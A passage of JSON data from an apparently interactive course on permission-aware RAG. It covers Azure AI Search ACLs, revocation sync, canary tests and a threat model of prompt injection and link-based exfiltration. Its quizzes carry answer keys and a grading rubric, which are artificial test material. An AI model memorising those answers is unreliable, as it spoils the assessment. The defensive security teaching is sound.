applicable."},"lake":{"s":-2,"why":"Not applicable."},"spo":{"s":2,"why":"Ingests inheritance, unique item ACLs and Entra groups."}},"status":{"ga":{"s":-2,"why":"Preview only."},"prev":{"s":2,"why":"Supported in preview, richer from 2026-05-01-preview."}},"revoke":{"hours":{"s":1,"why":"Item changes sync each run."},"minutes":{"s":0,"why":"Parent scope changes need an explicit resync."},"seconds":{"s":-2,"why":"Pull indexing cannot reach seconds."}},"rule":{"principals":{"s":2,"why":"Entra groups and unique item ACLs."},"label":{"s":0,"why":"Labels arrive through a separate preview."}}},"purview":{"source":{"custom":{"s":-2,"why":"Labels come only from Blob, ADLS Gen2, SharePoint and OneLake."},"lake":{"s":1,"why":"A supported source."},"spo":{"s":1,"why":"A supported source."}},"status":{"ga":{"s":-2,"why":"Preview only."},"prev":{"s":1,"why":"Preview with caveats: system-assigned identity, single tenant."}},"revoke":{"hours":{"s":1,"why":"Label changes arrive with ingestion."},"minutes":{"s":0,"why":"Bound by indexer runs."},"seconds":{"s":-1,"why":"Pull indexing lags."}},"rule":{"principals":{"s":-1,"why":"Labels do not replace per-person ACLs."},"label":{"s":2,"why":"Classification decides. Project labels onto each chunk row."}}},"remote":{"source":{"custom":{"s":-2,"why":"Nothing in Microsoft 365 to delegate to."},"lake":{"s":-2,"why":"Not applicable."},"spo":{"s":2,"why":"SharePoint answers with the caller's token."}},"status":{"ga":{"s":-1,"why":"Check the exact status. Retrieval API pay-as-you-go is preview."},"prev":{"s":1,"why":"Fine once you accept the preview terms."}},"revoke":{"hours":{"s":0,"why":"Overkill for this speed."},"minutes":{"s":1,"why":"No copy to go stale."},"seconds":{"s":2,"why":"Permissions are read at query time."}},"rule":{"principals":{"s":2,"why":"The source applies its own rules."},"label":{"s":1,"why":"Purview protections still apply to retrieved content."}}}},"takeaway":"GA means security filters. Native ACLs shine for ADLS Gen2 and Blob, the SharePoint indexer for SharePoint with preview accepted, and delegation when seconds-level revocation matters. Say preview out loud."},{"t":"failure","title":"Failure modes to recognise","items":[{"symptom":"Results come back unfiltered although the header is sent.","cause":"An indexed knowledge source was created without `ingestionPermissionOptions`, so the index has no permission metadata.","fix":"Set it at creation (still preview in 2026-04-01) and verify with a revoked test user [[r17]]."},{"symptom":"A service-side test with an API key returns only a few documents.","cause":"Since `2025-11-01-preview` ACL filters apply even with a key or admin role, and a missing token returns public documents only.","fix":"Send the user token, use elevated read for debugging and re-test anything validated on older previews."},{"symptom":"A folder permission change never reaches the index.","cause":"Parent scope changes are not picked up per indexer run. ADLS Gen2 needs a resync and push ingestion needs a reingest [[r16]].","fix":"Call `/resync` with `options: [\"permissions\"]` or `/resetdocs` for SharePoint, resync ADLS, reingest pushed documents and audit drift."},{"symptom":"Some users lose documents shared through an Entra group inside a SharePoint group.","cause":"That nested relationship is not expanded, so the results are filtered out.","fix":"Grant through supported group relationships or flatten membership at the source."},{"symptom":"A few heavily shared files seem to ignore part of their ACL.","cause":"Entries beyond 32 per ADLS Gen2 file or 1,000 per SharePoint file might not be enforced.","fix":"Shrink ACLs with groups and flag items above the limit during ingestion."}]}],"quiz":[{"id":"w07-l5-q1","type":"single","tag":"diagnose","q":"A test that used an API key and no user token returned about a dozen documents on `2026-08-01-preview`. On an older preview it returned every document. What explains the difference?","code":{"lang":"http","code":"POST {endpoint}/indexes/hr/docs/search?api-version=2026-08-01-preview\napi-key: {admin-key}\n\n{ \"search\": \"*\", \"count\": true }"},"options":["ACL filters apply even with an API key, and a missing user token returns only public documents","The index lost its permission fields when the API version changed, so the service samples documents","The admin key lacks the Search Index Data Reader role for the index, so results are truncated","Graph was unavailable, so the service returned a partially filtered page"],"answer":0,"explain":"From `2025-11-01-preview` the filters apply regardless of the credential, and with no token only documents marked public (`all`) match. Earlier previews returned everything for a key or admin role. Losing fields would change the schema, a missing role would fail the call, and Graph failures return 5xx rather than a partial page.","difficulty":2,"ref":"r12"},{"id":"w07-l5-q2","type":"multi","tag":"security","q":"Select every true statement about native ACL enforcement in Azure AI Search (preview as of 2026-10-13).","options":["Group membership is resolved through Microsoft Graph at query time, so nested groups work.","A document passes only when userIds, groupIds and rbacScope all match.","If Graph is unavailable the service returns a 5xx instead of a partially filtered result.","The features are GA in the stable `2026-04-01` API.","A document passes if any one of userIds, groupIds or rbacScope matches."],"answers":[0,2,4],"explain":"Filters are applied independently and any match authorizes the document, Graph expands groups at query time and a Graph failure fails closed. The features are not part of the stable 2026-04-01 API, and an all-must-match rule would contradict the any-match behaviour the docs describe.","difficulty":2,"ref":"r12"},{"id":"w07-l5-q3","type":"match","tag":"concept","q":"Match each Azure AI Search approach to a constraint you must plan for.","pairs":[{"l":"Security filters","r":"GA on any API version, but nothing authenticates the string"},{"l":"POSIX-like ACL and RBAC scopes","r":"At most 1,000 values per userIds or groupIds field"},{"l":"SharePoint indexer ACLs","r":"An Entra group nested in a SharePoint group is not expanded"},{"l":"Purview sensitivity labels","r":"System-assigned managed identity only"}],"explain":"Each approach has a distinct limit: security filters are a plain string match you secure yourself, native ACL fields hold 1,000 values, the SharePoint indexer drops the mixed Entra-in-SharePoint-group relationship and Purview label ingestion rejects user-assigned identities.","difficulty":2,"ref":"r11"},{"id":"w07-l5-q4","type":"single","tag":"flip","q":"A test user without access still sees a file from an indexed SharePoint knowledge source, even with the user token sent. Which change fixes it?","options":["Send a token with broader scopes on every query","Set `retrievable: false` on the content field","Use an admin API key so filtering is forced","Recreate it with `ingestionPermissionOptions`"],"answer":3,"explain":"Without `ingestionPermissionOptions` at creation the index carries no permission metadata, so the header has nothing to match and results come back unfiltered. Broader scopes and admin keys do not add metadata, and `retrievable: false` only hides a field from responses.","difficulty":3,"ref":"r17"}],"defend":null,"refs":["r11","r12","r13","r15","r16","r17","r18"],"takeaways":["Only security filters are GA. Native ACLs, Purview labels and SharePoint ACLs are preview as of 2026-10-13.","Native ACL queries need two checks: the app's role and the user's token. A missing token returns public documents only.","Freshness equals your sync path: SharePoint parent changes need a resync, ADLS needs a resync, push needs a reingest.","Create indexed knowledge sources with `ingestionPermissionOptions` or results come back unfiltered.","Use elevated read to debug, and keep it off the app's normal identity."]},{"id":"w07-l6","order":6,"title":"Keep it true: sync, drift and revocation","kind":"problem","minutes":22,"brief":"Permissions change after the index is built: people leave, folders move, groups are renamed. Decide how a change reaches every copy, how you detect the ones it missed, and how you prove revocation works before a user proves it does not.","blocks":[{"t":"h","text":"Revocation is a chain of copies","level":2,"id":"revocation-is-a-chain-of-copies"},{"t":"p","md":"The source ACL is copied into the index, group memberships sit in caches and tokens, answers sit in caches and the text sits in logs. The slowest link sets your real revocation time. A **revocation SLA is a choice per sensitivity tier, not a vendor number**. As planning estimates, which are design reasoning and not vendor figures: seconds to minutes for restricted data, hours for general internal content.\n\nPull indexers cannot beat the next run, since the schedule `interval` runs from 5 to 1,440 minutes [[r19]]. Push ingestion can patch only the ACL field with `merge`, so revocation can take seconds, but you own the change feed [[r15]]. For SharePoint, from `2026-05-01-preview` item-level ACL changes are picked up each run, while parent-scope changes need `/resync` [[r16]]. Graph change notifications can trigger the push path and a delta query can reconcile what was missed. Pairing them is design guidance, not a documented SLA [[r27]] [[r35]]."},{"t":"diagram","id":"w07-l6-d1","title":"Where a revocation has to travel","alt":"A source ACL change reaches the index ACL field by polling or events. A group change reaches the app principal set through cache TTL and token lifetime. Both feed the next query. The answer cache and logs sit after the query.","src":"flowchart LR\n  S[Source ACL change] -->|poll or event| X[Index ACL field]\n  S -->|group change| G[Group membership]\n  G -->|cache TTL, token life| A[App principal set]\n  X --> Q[Next query]\n  A --> Q\n  Q --> C[Answer cache TTL]\n  C --> L[Logs and traces]","caption":"Each arrow has its own delay. Write the SLA for the tier, then check every arrow against it."},{"t":"stats","items":[{"label":"Indexer schedule interval","value":"5 to 1,440 min","note":"The floor for pull-based revocation"},{"label":"Graph directory subscription maximum","value":"41,760 min","note":"Renew before expiry and handle lifecycle notifications"},{"label":"driveItem notification latency","value":"under 1 min, 6 h max","note":"Average and maximum. Do not promise tighter than the maximum"},{"label":"ACL entries enforced per item","value":"32 and 1,000","note":"ADLS Gen2 per file or directory, SharePoint per file. More might not be enforced"}]},{"t":"dials","id":"w07-l6-sync","title":"How should permission changes travel?","prompt":"Set the revocation target, where permissions are defined and which change signals you can get. The best mechanism changes.","dials":[{"id":"sla","label":"Revocation target","values":[{"id":"hours","label":"Hours"},{"id":"minutes","label":"Minutes"},{"id":"seconds","label":"Seconds"}]},{"id":"inherit","label":"Where permissions are set","values":[{"id":"item","label":"On each item"},{"id":"parent","label":"Inherited from folders, sites or groups"}]},{"id":"feed","label":"Change signals available","values":[{"id":"event","label":"Events or webhooks exist"},{"id":"poll","label":"Polling only"}]}],"options":[{"id":"pull","name":"Scheduled pull indexer","summary":"The indexer re-reads permissions on a schedule."},{"id":"push","name":"Push ACL merge on change events","summary":"Patch only the ACL field when an event arrives."},{"id":"notify","name":"Graph notifications plus delta reconciliation","summary":"Notify, then fetch the delta and reconcile."},{"id":"nocopy","name":"No copy: delegate to the source","summary":"The source answers with the caller's token."},{"id":"resync","name":"Periodic full resync and drift audit","summary":"Re-read everything and compare with the source."}],"scores":{"pull":{"sla":{"hours":{"s":2,"why":"A schedule matches the target."},"minutes":{"s":0,"why":"The interval floor is 5 minutes."},"seconds":{"s":-2,"why":"Cannot reach seconds."}},"inherit":{"item":{"s":1,"why":"Item ACL changes sync each run."},"parent":{"s":-1,"why":"Parent scope changes need an explicit resync."}},"feed":{"event":{"s":0,"why":"Ignores events you already have."},"poll":{"s":2,"why":"Built for sources you can only poll."}}},"push":{"sla":{"hours":{"s":1,"why":"Works, with more machinery than needed."},"minutes":{"s":2,"why":"Merge the ACL field when an event arrives."},"seconds":{"s":2,"why":"`merge` updates the ACL field immediately."}},"inherit":{"item":{"s":1,"why":"Patch the item's ACL field."},"parent":{"s":-1,"why":"You must fan an inherited change out to every child."}},"feed":{"event":{"s":2,"why":"Events drive the update."},"poll":{"s":-2,"why":"No events to react to."}}},"notify":{"sla":{"hours":{"s":0,"why":"Overkill for this speed."},"minutes":{"s":1,"why":"Notifications average under a minute."},"seconds":{"s":-1,"why":"Latency can reach 6 hours, so no tight promise."}},"inherit":{"item":{"s":1,"why":"Delta lists changed items."},"parent":{"s":1,"why":"Delta reports the changed scope, then you reconcile children."}},"feed":{"event":{"s":2,"why":"A webhook endpoint and renewal are available."},"poll":{"s":-1,"why":"Needs a public endpoint and renewal before expiry."}}},"nocopy":{"sla":{"hours":{"s":0,"why":"Overkill for this speed."},"minutes":{"s":1,"why":"No copy to sync."},"seconds":{"s":2,"why":"The source answers live."}},"inherit":{"item":{"s":1,"why":"The source answers per item."},"parent":{"s":2,"why":"The source resolves inheritance."}},"feed":{"event":{"s":1,"why":"No feed needed."},"poll":{"s":1,"why":"No feed needed."}}},"resync":{"sla":{"hours":{"s":1,"why":"A nightly pass can meet it."},"minutes":{"s":-1,"why":"A full pass is too slow."},"seconds":{"s":-2,"why":"Far too slow."}},"inherit":{"item":{"s":0,"why":"Redundant for item changes."},"parent":{"s":2,"why":"Catches inherited changes that events missed."}},"feed":{"event":{"s":0,"why":"A safety net behind events."},"poll":{"s":1,"why":"Works without any feed."}}}},"takeaway":"Most designs run two mechanisms: a fast one for changes you can see and a slow audit for the ones you cannot. Whatever you pick, state the SLA per tier and test it."},{"t":"flow","title":"Prove revocation with a canary","direction":"v","steps":[{"title":"Plant","md":"Create a canary document with a unique phrase and an ACL that includes a test user.","tag":"setup"},{"title":"Confirm access","md":"Ask a question only the canary can answer, as the test user. It must appear with a citation."},{"title":"Revoke at the source","md":"Remove the user from the group or the document ACL. Record the time.","tag":"change"},{"title":"Wait the SLA","md":"Wait the stated revocation SLA for that tier, and no longer."},{"title":"Repeat the question","md":"The phrase must be absent from the answer, the citations, the caches and the retrieval log.","tag":"assert"},{"title":"Delete and repeat","md":"Delete the canary at the source. It must disappear from the index and every cache. Run the whole test nightly and alert on failure."}]},{"t":"failure","title":"Failure modes to recognise","items":[{"symptom":"A daily drift audit finds a few percent of sampled documents whose index ACL differs from the source, all under one folder.","cause":"A parent-scope change inherited by child items was not refreshed by a normal indexer run.","fix":"Sample daily, compare index ACL with source ACL, alert on any mismatch, track the age of the oldest unsynced change and resync the affected scope."},{"symptom":"Graph notifications stop arriving after a few weeks.","cause":"Directory subscriptions expire (maximum 41,760 minutes) and nobody renewed them or handled lifecycle notifications.","fix":"Renew before expiry, handle lifecycle notifications and fall back to a delta reconciliation."},{"symptom":"A deleted document still helps answer questions.","cause":"Deletes are not mirrored to the index, or an answer cache holds the text.","fix":"Propagate tombstones to the index and caches and include a delete step in the canary test."},{"symptom":"Document ACLs sync in minutes but a removed member keeps access for an hour.","cause":"Membership cache TTL or token lifetime dominates the chain.","fix":"Count those TTLs in the SLA, shorten them for restricted tiers and live-check the top hits."}]},{"t":"callout","kind":"interview","title":"What interviewers listen for","md":"How do you test that revoking access really removes documents from answers? Say canary document, revoked test user and an end-to-end assertion on answers, caches and logs. Quote an SLA per tier, name the slowest link and say how you detect drift."}],"quiz":[{"id":"w07-l6-q1","type":"order","tag":"order","q":"Put the steps of a revocation test in order.","items":["Plant a canary document whose ACL includes a test user","Ask as the test user and confirm the canary is cited","Revoke the user at the source and record the time","Wait the stated revocation SLA","Ask again and confirm the canary is absent from answers, caches and logs"],"explain":"You must prove access works before revoking, otherwise an absent canary proves nothing. You record the revocation time, wait only the stated SLA and then assert on every copy: answer, caches and logs.","difficulty":1,"ref":"r12"},{"id":"w07-l6-q2","type":"single","tag":"diagnose","q":"The drift audit reports the following. Which cause fits best?","code":{"lang":"text","code":"drift audit: 38 of 1,000 sampled docs differ\nall under /sites/finance/Q3/\nlast indexer run: success, 12 minutes ago"},"options":["The indexer failed silently on every run","A parent-scope permission change that child items inherit needs a resync","The search service has too few replicas for ACL queries","The groups claim exceeded the token limit"],"answer":1,"explain":"Item-level ACL changes sync on each run, but changes to a parent scope such as a folder or library inherited by children need `/resync` with `options: [\"permissions\"]`. The last run succeeded, replicas do not alter ACL values and token claims affect query-time identity, not stored ACLs.","difficulty":2,"ref":"r16"},{"id":"w07-l6-q3","type":"single","tag":"tradeoff","q":"A restricted tier must revoke within about a minute. The source is a custom system with a change feed and ACLs set per item. Which mechanism fits?","options":["A scheduled pull indexer set to its 5 minute floor","A nightly full resync of every document and ACL","Graph driveItem notifications on the custom system","Push ACL merges on change events"],"answer":3,"explain":"Push ingestion can `merge` only the ACL field as soon as an event arrives, which fits a one minute target. A pull indexer cannot go below 5 minutes, a nightly resync is a safety net and driveItem notifications apply to OneDrive and SharePoint items, not a custom system. Add a drift audit behind it.","difficulty":2,"ref":"r15"},{"id":"w07-l6-q4","type":"multi","tag":"concept","q":"Select every true statement about using Microsoft Graph for permission sync.","options":["Subscriptions on directory resources expire and must be renewed.","A delta query returns changes since the last sync through a delta token.","Pairing notifications with a delta reconciliation is a documented SLA.","driveItem notifications always arrive within one second."],"answers":[0,1],"explain":"Directory subscriptions have a maximum lifetime and need renewal, and delta queries return changes since the last token. The pairing is design guidance, not a documented SLA, and driveItem latency is under one minute on average with a six hour maximum.","difficulty":2,"ref":"r27"}],"defend":null,"refs":["r12","r15","r16","r19","r27","r35"],"takeaways":["A revocation SLA is a choice per tier. The slowest copy in the chain sets the real number.","Pull indexers cannot beat 5 minutes, push merges can reach seconds, and SharePoint parent changes need a resync.","Run two mechanisms: a fast path for events and a slow audit for what events miss.","Graph subscriptions expire, so renew them and reconcile with a delta query.","Prove revocation with a canary and a revoked test user, and assert on answers, caches and logs."]},{"id":"w07-l7","order":7,"title":"Boss: design the wall, then handle the leak","kind":"boss","minutes":25,"brief":"An interviewer asks you to design access control for a RAG assistant, with every dial unspecified, and then reports a leak. Practise the five steps of Dial-and-Defend: clarify, list options, pick and flip, name failures, name metrics and rollout.","blocks":[{"t":"h","text":"The interview prompt","level":2,"id":"the-interview-prompt"},{"t":"scenario","title":"What you know and what to ask","known":["A RAG assistant answers employee questions over internal documents","Permissions exist in the source systems","A week after launch a user reports seeing a snippet they should not have access to"],"ask":["Where do the documents live and how rich are the permissions?","How selective is access, and how fast must revocation take effect per tier?","Does the user's token reach retrieval, and how many groups does a user hold?","Who writes the corpus, what does the client render and can the assistant act?","What do caches, logs and traces hold today?"],"tension":"Instant revocation, full recall and low latency pull in different directions. Say which dial you trade."},{"t":"diagram","id":"w07-l7-d1","title":"A defensible request path","alt":"A user request goes through an API gatekeeper that resolves principals from the token, runs a pre-filtered search, live-checks the top hits for restricted tiers, then spotlights and sanitizes before the answer.","src":"flowchart LR\n  U[User token] --> G[API gatekeeper]\n  G --> P[Resolve principals]\n  P --> S[Pre-filtered search]\n  S --> V[Live check top hits]\n  V --> M[Spotlight and generate]\n  M --> O[Sanitize output]","caption":"One gatekeeper in front of every store. Every retrieval, including agent tool calls, passes through it."}],"quiz":[{"id":"w07-l7-q1","type":"order","tag":"order","q":"A user reports seeing a snippet from a document they cannot open. Put the response in order.","items":["Contain: fail closed on the affected path","Preserve evidence: principal, document, chunk and filter ids","Reproduce the query as the reporter","Classify the cause: drift, missing filter, overage, cache or source setting","Fix, purge caches, resync and add a regression canary"],"explain":"Containment comes first because the exposure window keeps growing while you investigate. Evidence must be captured before caches expire, reproduction confirms the cause, classification points at the fix, and the regression canary stops the same leak returning.","difficulty":1,"ref":"r22"},{"id":"w07-l7-q2","type":"multi","tag":"security","q":"Select every item that belongs in a retrieval log for a permissioned corpus by default.","options":["Document and chunk ids","The principal id","A hash of the filter that was applied","Full chunk text kept indefinitely for all users","The allow or deny outcome"],"answers":[0,1,2,4],"explain":"Ids, principal, filter hash and outcome let you reproduce and audit a decision without copying protected text into a store that has no ACLs. Full text kept indefinitely is the log-as-leak pattern. Capture content only for a bounded window with its own access control.","difficulty":2,"ref":"r2"},{"id":"w07-l7-q3","type":"single","tag":"flip","q":"Your design uses native ACLs, which are preview as of 2026-10-13. Legal now requires GA features only in production. Which change keeps most of the design?","options":["Switch to a post-filter in application code and over-fetch generously","Drop access control for documents labelled low sensitivity","Move to security filters and resolve groups yourself","Give each user a private index with a nightly rebuild"],"answer":2,"explain":"Security filters are GA on any API version and keep the pre-filter shape. You take on group resolution (Graph, with overage handling) and ACL updates with `merge`, and you lose deny entries and token-based enforcement. A post-filter weakens recall and leaks denied text to later stages, dropping controls is not a design, and per-user indexes do not scale.","difficulty":2,"ref":"r13"}],"defend":{"prompt":"Design access control for a RAG assistant that answers employee questions over internal documents. Walk me through the options and your choice. A week after launch, an employee reports seeing a snippet from a document they should not have access to. Walk me through your response.","timebox":"6 min","clarify":["Where do the documents live, and what do permissions look like: tenant tag, nested groups, per-document ACLs, deny rules, sharing links, guests?","How selective is access: what share of the corpus does a typical caller see?","How fast must revocation take effect for each sensitivity tier?","Does the user's token reach retrieval end to end, and how many groups does a user hold?","Who can write to the corpus, what does the client render and can the assistant take actions?","Is GA required or is preview acceptable, and how many tenants are there and how skewed are they?"],"options":[{"name":"Pre-filter in the index, with a live check on restricted tiers","when":"Content is copied into the index, permissions are group based and revocation needs minutes for most content and seconds for a restricted tier.","tradeoff":"Sync lag for the bulk, and the live check adds latency and source load. Native ACLs are preview, security filters are GA."},{"name":"Delegate retrieval to the source system","when":"Content lives in Microsoft 365 and permissions must be honoured at query time.","tradeoff":"Little control over ranking and filters, and rate limits such as 200 requests per user per hour on the Copilot Retrieval API."},{"name":"Physical walls per tenant","when":"A few large or regulated tenants whose access is only the tenant id.","tradeoff":"Index caps, cost and operations grow with tenants, and group access inside a tenant still needs a filter."},{"name":"Post-filter in application code","when":"Almost every document is visible to almost every caller and the rules are too rich to precompute.","tradeoff":"Starves the top k under selective access and lets denied text reach rerankers, logs and caches."}],"modelAnswer":[{"t":"p","md":"**1. Clarify the dials.** I would ask where the content lives, how rich the permissions are, how selective access is, how fast revocation must be per tier, whether the user's token reaches retrieval, who writes to the corpus and what the client renders."},{"t":"p","md":"**2. Options.** Four options: pre-filter in the index (security filters are GA, native ACLs are preview), delegate retrieval to the source, physical walls per tenant, and the boring post-filter in application code."},{"t":"p","md":"**3. Choice for assumed dials.** Assume content copied into Azure AI Search from SharePoint and a file lake, group-based ACLs, callers who see about 5% of the corpus, revocation in minutes for most content and seconds for a restricted tier, and preview accepted for a pilot. I would:"},{"t":"list","style":"ol","items":["Pass the user's token end to end with on-behalf-of, resolve groups from the token or Graph, handle group overage and fail closed on any error.","Pre-filter in the index with native ACLs (preview as of 2026-10-13), or security filters if GA is mandatory.","Live-check the top hits at the source for the restricted tier.","Put one API gatekeeper in front of every store and apply the filter to every retrieval, including agent tool calls.","Key caches by ACL scope, keep TTLs below the revocation SLA and skip caches for restricted labels.","Log ids and decisions, not content.","Spotlight retrieved text, strip or allowlist links and images in output and keep the assistant read-only, which removes one leg of the trifecta."]},{"t":"p","md":"**What would flip it.** Seconds-level revocation for everything with content in Microsoft 365 flips me to delegation. Few large tenants with a tenant-id permission model flips me to walls. GA-only flips me to security filters with my own group resolution. Near-universal visibility makes a post-filter acceptable."},{"t":"table","head":["Failure mode","How I detect it"],"rows":[["Post-filter starvation or filtered-recall loss","Results per query, and filtered recall against a brute-force baseline"],["ACL drift","Daily sampled compare of index ACL with source ACL, and the age of the oldest unsynced change"],["Revocation lag or stale caches","Nightly canary test with a revoked user, asserting on answers, caches and logs"],["Group overage failing open or closed","A test user with 300 groups in CI"],["Injection or exfiltration","Red-team documents with planted instructions, and egress alerts for unknown hosts"]]},{"t":"p","md":"**5. Metrics and rollout.** I would track revocation lag at p95 per tier, drift rate, empty-result rate, canary pass rate and egress to unknown hosts. I would start with one department, run canary documents and a revoked test user in CI, then widen."},{"t":"callout","kind":"interview","title":"The leak report","md":"**Contain** first: fail closed for the affected path or tier. **Preserve evidence**: principal, document, chunk and filter ids. **Reproduce** the query as the reporter. **Classify** the cause: ACL drift, a parent-scope change, group overage treated as open, a code path with no filter such as an agent tool, an indexed knowledge source created without `ingestionPermissionOptions`, a shared cache or a stale membership cache. **Fix** by resyncing the scope, purging caches and adding the missed path to the gatekeeper, then add a regression canary and report according to your incident policy."}],"rubric":[{"pt":"Asks about permission model, selectivity, revocation SLA and identity before naming a technology","w":3},{"pt":"Offers at least three enforcement options including the boring post-filter, and picks for stated dials","w":3},{"pt":"Passes the user's identity end to end, handles group overage and fails closed","w":2},{"pt":"Labels Azure AI Search native ACLs as preview and names the GA alternative","w":2},{"pt":"Covers sync and revocation: an SLA per tier, a canary test and a drift audit","w":2},{"pt":"Treats caches and logs as copies outside the ACL and scopes them","w":2},{"pt":"Addresses injection and exfiltration with layers and a removed trifecta leg","w":1},{"pt":"Runs the leak response in order: contain, preserve, reproduce, classify, fix, regression test","w":3}],"followUps":[{"q":"The reporter belongs to 300 groups. What do you check first?","a":"Overage handling. Above 200 groups the JWT carries an indicator instead of the list. If the code treated that as no groups or as no filter it fails open or closed for exactly these users. Call Graph `transitiveMemberOf`, page at 999 and fail closed on error."},{"q":"How do you know the filter runs on agent tool calls?","a":"One gatekeeper API in front of every store, plus a canary test through each retrieval path including tools. A per-path test catches the path that forgot the filter."},{"q":"Preview is not allowed in production. What changes?","a":"Move to security filters, which are GA on any API version. You own group resolution through Graph and ACL updates with `merge` or `mergeOrUpload`, you lose deny entries, and you keep the same canary, drift and cache rules."}],"redFlags":["Puts the rule in the system prompt and calls it access control.","Filters after retrieval and never mentions over-fetch, or denied text reaching rerankers, caches and logs.","Calls native ACLs GA, or promises instant revocation without a per-source SLA.","Responds to the leak by tuning the prompt before containing and reproducing it."]},"refs":["r2","r10","r11","r12","r13","r22","r25","r36","r37"],"takeaways":["Clarify the permission model, selectivity, revocation SLA and identity path before naming a technology.","Pre-filter for the bulk, live-check restricted tiers, one gatekeeper, caches and logs scoped, and say preview out loud.","Test revocation with a canary and a revoked user on a schedule.","A leak report follows an order: contain, preserve, reproduce, classify, fix, regression test.","Study next: the AI security fundamentals path and the red teaming short course."]}],"topics":[{"id":"w07-t01","order":1,"group":"Threats","title":"RAG threat model and OWASP LLM Top 10 2025","minutes":8,"difficulty":"core","summary":"A threat model for RAG lists what you protect, who can write into each stage and where text crosses a trust boundary, then maps those risks to the OWASP LLM Top 10 2025 ids.","useIf":"You are starting a RAG design review and need a shared vocabulary for what can go wrong.","avoidIf":"You already have a threat model and need a specific control. Jump to the access control or defence topics.","explain":[{"t":"p","md":"The model can only leak what retrieval hands it, and it will follow any instruction that arrives inside that text. A RAG threat model therefore starts with two questions: **who can write into each stage** and **what can each stage read or send out**. Assets are the documents and their permissions, the embeddings, the system prompt, the caller's identity and tokens, and every tool the model can call."},{"t":"diagram","id":"w07-t01-d1","title":"Where text crosses a trust boundary","alt":"Writers feed ingestion and the index. A caller's question and the retrieved chunks both enter the prompt. The model output reaches a client and tools, which are the exit points.","src":"flowchart LR\n  W[Writers: staff, customers, web] --> I[Ingestion]\n  I --> X[(Index)]\n  C[Caller question] --> R[Retrieval]\n  X --> R\n  R --> P[Prompt]\n  P --> M[Model]\n  M --> O[Output renderer]\n  M --> T[Tools]"},{"t":"p","md":"Every arrow that carries text written by someone other than the caller is an attack path. Run the model in three passes:"},{"t":"list","style":"ol","items":["List the assets and who may see each one.","List the writers at each stage and mark the untrusted ones.","List the exits: the output renderer, tools, logs and caches."]},{"t":"p","md":"The OWASP LLM Top 10 2025 names the risks that matter at each point [[r1]]."},{"t":"table","caption":"OWASP LLM Top 10 2025 items that touch RAG","head":["Id","Risk","RAG shape","First control"],"rows":[["LLM01","Prompt Injection","Instructions hidden in a retrieved chunk. RAG and fine-tuning do not fully mitigate it [[tr1]]","Least privilege, no outbound channel, layered detection"],["LLM02","Sensitive Information Disclosure","Chunks the caller may not read reach the prompt [[tr2]]","Enforce access in retrieval with the caller's identity"],["LLM04","Data and Model Poisoning","Manipulated embedding data steers answers [[tr3]]","Source authentication, provenance, ingest review"],["LLM05","Improper Output Handling","Rendered Markdown or links carry data out [[tr4]]","Encode output, strict content security policy"],["LLM06","Excessive Agency","Tools broader than the task [[tr5]]","Minimum tools, scopes and approval"],["LLM07","System Prompt Leakage","Prompt used as a secret or as authorization [[tr6]]","Keep secrets and rules outside the prompt"],["LLM08","Vector and Embedding Weaknesses","Cross-tenant leaks, inversion, poisoning [[r2]]","Permission-aware stores, logical partitioning"]]},{"t":"callout","kind":"note","title":"Two neighbouring lists","md":"OWASP also published a Top 10 for Agentic Applications 2026 (ASI01 to ASI10) on 2025-12-09 [[r3]], and MITRE ATLAS lists RAG techniques such as AML.T0064 and AML.T0070 [[r4]]. Do not confuse them with the LLM list."}],"whereToUse":["Design reviews before a RAG assistant gets access to real documents","Interview answers that must show a layered view instead of one guard","Choosing which of the later topics to read first for your corpus and tools","Incident post-mortems: classify the leak by id and by stage"],"whenToUse":{"use":["A new corpus mixes authors you do not fully trust","The assistant can call tools or render rich output","Several teams own different pipeline stages"],"avoid":["You need an implementation recipe: use the topic for that control","The system has no retrieval and no tools, so most items drop out","You expect the list to be complete: it is a shared vocabulary, not a design"],"flips":["The corpus is written only by vetted staff: weight LLM04 lower and LLM02 higher","The assistant gains a send or write tool: LLM06 and LLM01 move to the top"]},"alternatives":{"title":"Ways to frame the risk","head":["Framing","Wins when","Loses when","Cost or risk"],"rows":[["Stage-by-stage trust map (this topic)","You can name every writer and exit","The system changes weekly and the map goes stale","Needs an owner per stage"],["OWASP LLM Top 10 checklist","You need shared ids for audits","You treat the list as complete","Misses design-specific flows"],["OWASP Agentic Top 10 and ATLAS","The system plans and acts","It is a plain Q&A bot","More vocabulary than needed"],["Single control (one guard)","A quick demo","Any real data is present","One bypass breaks everything"]]},"pitfalls":[{"symptom":"The review lists only prompt injection","cause":"Treating RAG as a prompt problem","fix":"Walk each stage: ingest, index, retrieve, prompt, output, tools"},{"symptom":"Everyone assumes the system prompt enforces access","cause":"LLM07 is ignored: the prompt is not a secret or a control","fix":"Move rules and secrets to code that runs outside the model"},{"symptom":"Threat model never updates","cause":"No trigger on new sources or tools","fix":"Re-run it whenever a writer, tool or output channel is added"}],"scenarios":[{"id":"w07-t01-s1","title":"Read-only assistant over staff-written pages","situation":"An assistant answers questions over an internal wiki. Everyone with write access is an employee. The assistant has no tools and renders plain text. Documents carry per-team permissions.","constraints":["Corpus authors are vetted employees","No tools, no outbound channel","Permissions differ by team"],"unknowns":["Who can edit pages, and can contractors?","Does the client render Markdown or fetch images?"],"question":"Which risk do you address first?","options":[{"name":"Add a prompt-injection classifier on every chunk","verdict":"good","why":"Cheap insurance against a careless or malicious edit.","tradeoff":"Adds latency and false positives while the main exposure stays open."},{"name":"Enforce the caller's permissions inside retrieval (LLM02, LLM08)","verdict":"best","why":"Authors are trusted and there is no outbound channel, so the realistic loss is a chunk reaching the wrong reader.","tradeoff":"Needs ACL capture at ingest and a sync story."},{"name":"Tell the model in the system prompt not to reveal restricted pages","verdict":"poor","why":"The model is not an authorization layer and the prompt can be extracted or overridden.","tradeoff":"Fine as a tone instruction, never as the access control."}],"flips":[{"if":"Anyone on the internet can edit a page","then":"Injection and poisoning rise to the top: add ingest review and spotlighting."},{"if":"The client renders images from model output","then":"Output handling (LLM05) joins the first tier."}],"takeaway":"Rank risks by who can write, what can leave and how much agency exists."},{"id":"w07-t01-s2","title":"Customer tickets in, email out","situation":"A support agent reads customer-submitted tickets, looks up account data and can send replies automatically. Volume is high and replies are sent without review.","constraints":["Untrusted authors (customers)","Private account data in scope","Agent can send messages externally"],"unknowns":["Can a reply include data from other accounts?","Is a human review step acceptable for some replies?"],"question":"How do you reduce the risk most?","options":[{"name":"Stack a classifier, spotlighting and a stricter prompt","verdict":"good","why":"Lowers attack success and is worth having.","tradeoff":"All three are probabilistic, so a single bypass still reaches the channel."},{"name":"Rely on one best-in-class input 